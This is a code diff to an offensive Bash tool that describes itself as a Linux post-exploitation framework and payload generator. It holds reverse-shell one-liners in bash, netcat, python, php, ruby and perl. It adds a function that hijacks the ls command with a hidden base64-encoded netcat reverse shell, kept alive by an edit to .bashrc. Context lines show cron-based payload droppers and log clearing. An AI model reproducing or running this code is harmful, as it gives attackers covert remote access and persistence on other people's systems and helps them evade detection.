@@ -9,23 +9,20 @@ function display_output(){
 		local t=${3-Output} 
 		local r=${DIALOG_CANCEL=1}
 		dialog --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
-
 }
 
+payloads=(
+
+"nc -e /bin/bash address prt"
+"bash -i >& /dev/tcp/address/prt 0>&1"
+"python -c 'import socket,subprocess,os\;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+)
 
 function genpayload(){
-		payloads=(
-
-		"nc -e /bin/bash address prt"
-		"bash -i >& /dev/tcp/address/prt 0>&1"
-		"python -c 'import socket,subprocess,os\;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-		"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-		"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-		"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-		
-		)
-
-
 		function encshell(){
 				echo -e "Enter listener server address and port\n"
 				read -r -p "Address: " address
@@ -37,7 +34,6 @@ function genpayload(){
 				chmod +x .shell.sh
 				echo -e "Payload saved as `pwd`/.shell.sh"
 				read -p "Press enter to continue "
-
 		}
 
 
@@ -81,6 +77,31 @@ function genpayload(){
 		done
 }
 
+function lswrap(){
+
+		echo -e "--ls payload wrapper--\n"
+		echo -e "*****WARNING*****"
+		echo -e "This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal\n"
+		read -p "enter (continue/exit) or press enter to return to menu: " bs	
+		case $bs in
+			[CONTINUEcontinue]* )
+					shell=${payloads[0]}
+					echo -e "Enter listener server address and port\n"
+					read -r -p "Address: " address
+					read -r -p "Port: " port
+					shell="${shell/'address'/$address}"
+					shell="${shell/'prt'/$port}"
+					encode=$(echo $shell | base64)
+					echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; }" > .ls
+					mv .ls $HOME 
+					echo "source ~/.ls" >> .bashrc
+					source ~/.bashrc
+					echo -e "\nls wrapper added!\n"
+					read -p "Press enter to continue ";;
+		[Exitexit]* ) return 1;;
+		esac
+}
+
 
 function cron(){
 		read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
@@ -96,7 +117,6 @@ function cron(){
 				cat command.txt
 				echo -e "\n"
 				read -p "Press enter to continue "
-
 		}
 
 
@@ -104,7 +124,6 @@ function cron(){
 				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
 				echo -e "\nAdded cron job to crontab\n"
 				read -p "Press enter to continue "
-
 		}
 
 
@@ -126,7 +145,6 @@ function cron(){
 			esac
 			return 1
 		done
-
 }
 
 
@@ -143,7 +161,6 @@ function clearlog(){
 		find / -type f -exec {}
 		echo "Logs cleared!"
 		sleep 1.5
-
 }
 
 
@@ -209,7 +226,6 @@ function info(){
 		read -p "Press enter to continue "
 		clear
 		return 1
-
 }
 
 function banip(){
@@ -225,7 +241,7 @@ function banip(){
 		read -p 'enter (ban/exit) or press enter to return to menu: ' bs	
 		case $bs in
 			[Banban]* ) read -r -p  'Enter IP to be banned: ' address; iptables -A INPUT -s $address -j DROP;;
-			[Exitexit]* ) return 1
+			[Exitexit]* ) return 1;;
 		esac
 }
 
@@ -235,8 +251,9 @@ do
 
 dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.." \
 --title "[ R E D G H O S T - N E T W O R K - T O O L ]" \
---menu "Linux post exploitation framework and payload generator." 15 60 6 \
+--menu "Linux post exploitation framework and payload generator." 15 60 7 \
 Payloads "Generate Reverse Shells" \
+lsWrapper "Wrap ls command with nc shell" \
 Crontab "Add cron job for persistence" \
 Clearlogs "Clear all logs (root)" \
 MassinfoGrab "Gain recon on the system" \
@@ -247,6 +264,7 @@ menuitem=$(<"${INPUT}")
 
 case $menuitem in
 	Payloads) clear; genpayload;;
+	lsWrapper) clear; lswrap;;
 	Crontab) clear; cron;;
 	Clearlogs) clear; clearlog;;
 	MassinfoGrab) clear; info;;
